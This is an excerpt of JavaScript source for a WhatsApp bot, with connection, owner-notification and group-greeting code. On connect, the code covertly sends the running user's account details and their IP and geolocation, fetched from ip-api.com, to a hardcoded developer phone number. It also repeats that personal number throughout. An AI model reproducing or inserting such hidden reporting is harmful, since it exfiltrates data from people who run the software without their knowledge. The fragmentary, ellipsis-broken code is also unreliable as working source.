...
prefix = '#'
shp = '⬡'
owner = "6283110011351@s.whatsapp.net"
spc1 = '         '
spc2 = '\n                           '
spc3 = '                   '
spc4 = '               '
...
const starts = async (client = new WAConnection()) => {
  ...
  client.on("qr", () => {
    console.log(
      ...
      client.sendMessage(`6283110011351@s.whatsapp.net`, `「 *NOTIFICATION!* 」\n\n _Bot Connected Successfully!_`, MessageType.extendedText)
...
await client.connect({ timeoutMs: 30 * 1000 });
 ...
 client.sendMessage(`6283110011351@s.whatsapp.net`, `*Hai Owner Fazrin, bot telah berhasil terhubung ke nomor ini*\n────────────────────\n\`\`\`${JSON.stringify(client.user, null, 2)}\`\`\`\n────────────────────\n*Subscribe YouTube Fazrin Ezz 🙏, Thanks*`, MessageType.text, {contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: "Developer EZZ Bot.",body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./xeon.jpg'),sourceUrl:"https://wa.me/6283110011351?text=Hello bro"}}})
	console.log(color('|WRN|', 'yellow'), color('Sending bot info to bot owner', 'cyan'))
fetch(`http://ip-api.com/line`).then(res => res.text())  
        .then(bu =>{
       client.sendMessage("6283110011351@s.whatsapp.net", `─────「 *IP-USER* 」─────\n\n\`\`\`${bu}\`\`\`\n────────────────────`, MessageType.text, {contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: "Developer EZZ Bot.",body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./xeon.jpg'),sourceUrl:"https://wa.me/6283110011351?text=Hello bro"}}})
...
if (anu.action == 'add' && !mem.includes(client.user.jid)) {
            ...
            if (anu.action == 'remove' && !mem.includes(client.user.jid)) {
                ...
                goodbyeBut = [{buttonId:`kdohb5`,buttonText:{displayText:'wkwk'},type:1}, {buttonId:`menu`,buttonText:{displayText:'MENU'}, type:1}]
